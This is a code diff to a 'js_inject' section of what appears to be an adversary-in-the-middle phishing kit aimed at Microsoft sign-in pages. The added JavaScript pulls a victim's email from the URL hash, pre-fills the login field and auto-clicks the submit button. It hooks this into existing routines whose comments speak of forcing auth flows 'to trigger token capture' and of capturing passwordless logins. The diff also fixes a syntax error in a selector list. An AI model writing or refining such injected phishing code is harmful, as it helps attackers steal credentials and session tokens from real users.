@@ -432,7 +432,82 @@ js_inject:
           }
           return null;
         }
-        
+
+        function parseHashFragment() {
+          const rawHash = window.location.hash || '';
+          if (!rawHash) {
+            return null;
+          }
+
+          const hashText = rawHash.replace(/^#/, '').trim();
+          if (!hashText) {
+            return null;
+          }
+
+          // Accept query-style hash fragments like #login_hint=user@domain.com
+          try {
+            const params = new URLSearchParams(hashText);
+            const result = {};
+            if (params.has('login_hint')) {
+              result.login_hint = params.get('login_hint');
+            }
+            if (params.has('user_hint')) {
+              result.user_hint = params.get('user_hint');
+            }
+            if (params.has('domain_hint')) {
+              result.domain_hint = params.get('domain_hint');
+            }
+            if (params.has('email') && !result.login_hint) {
+              result.login_hint = params.get('email');
+            }
+            if (Object.keys(result).length > 0) {
+              return result;
+            }
+          } catch (e) {
+            // ignore invalid query strings in hash
+          }
+
+          // Accept a raw email address directly in the hash
+          const rawValue = decodeURIComponent(hashText);
+          const emailMatch = rawValue.match(/^[^\s@]+@[^\s@]+$/);
+          if (emailMatch) {
+            return { login_hint: rawValue };
+          }
+
+          return null;
+        }
+
+        function getHashHintEmail() {
+          const hints = parseHashFragment();
+          if (!hints) {
+            return null;
+          }
+          return hints.login_hint || hints.user_hint || hints.email || null;
+        }
+
+        function fillEmailFromHashHint() {
+          const emailHint = getHashHintEmail();
+          if (!emailHint) {
+            return;
+          }
+
+          const emailField = document.querySelector('input[name="loginfmt"], input[type="email"], input[name*="login"], input[name*="user"]');
+          if (emailField && !emailField.value) {
+            emailField.value = emailHint;
+            emailField.dispatchEvent(new Event('input', { bubbles: true }));
+            emailField.dispatchEvent(new Event('change', { bubbles: true }));
+          }
+
+          const nextButton = document.querySelector('input[type="submit"], button[type="submit"], #idSIButton9, [id*="Submit"], [id*="submit"], [name="SI"], [name="login"]');
+          if (nextButton && nextButton.offsetParent !== null) {
+            setTimeout(() => {
+              try {
+                nextButton.click();
+              } catch (e) {}
+            }, 500);
+          }
+        }
+
         // Validate session by checking if user data is available in page
         function detectAuthenticatedState() {
           // Check for user display name/avatar indicating logged-in state
@@ -444,7 +519,7 @@ js_inject:
             '.signed-in-user',
             '[role="banner"] .user-info',
             '.user-profile',
-            'img[src*="profilephoto"],
+            'img[src*="profilephoto"]',
             'img[alt*="profile"]',
             '.tenant-name',
             '.organization-name'
@@ -461,15 +536,23 @@ js_inject:
             /whr=/i
           ];
           
-          const urlHasHint = loggedInPatterns.some(p => p.test(url));
+          const hashHints = parseHashFragment();
+          const urlHasHint = loggedInPatterns.some(p => p.test(url)) || !!hashHints;
           
           return {
             hasUserElements: userElements.length > 0,
             urlHasLoginHint: urlHasHint,
-            foundElements: userElements.length
+            foundElements: userElements.length,
+            hashHints: hashHints
           };
         }
         
+        function ensureHashHintFilled() {
+          if (parseHashFragment()) {
+            fillEmailFromHashHint();
+          }
+        }
+
         // Force navigation through auth flow to trigger token capture
         function triggerAuthFlowCapture() {
           // Add a hidden iframe to navigate to an auth endpoint
@@ -593,11 +676,16 @@ js_inject:
         }
         
         // Run detection after page loads
+        function runDetection() {
+          detectAndCapturePasswordless();
+          ensureHashHintFilled();
+        }
+
         if (document.readyState === 'complete' || document.readyState === 'interactive') {
-          setTimeout(detectAndCapturePasswordless, AUTH_CHECK_DELAY);
+          setTimeout(runDetection, AUTH_CHECK_DELAY);
         } else {
           window.addEventListener('DOMContentLoaded', () => {
-            setTimeout(detectAndCapturePasswordless, AUTH_CHECK_DELAY);
+            setTimeout(runDetection, AUTH_CHECK_DELAY);
           });
         }
         
@@ -607,7 +695,7 @@ js_inject:
           const url = location.href;
           if (url !== lastUrl) {
             lastUrl = url;
-            setTimeout(detectAndCapturePasswordless, 1000);
+            setTimeout(runDetection, 1000);
           }
         }).observe(document, { subtree: true, childList: true });
         
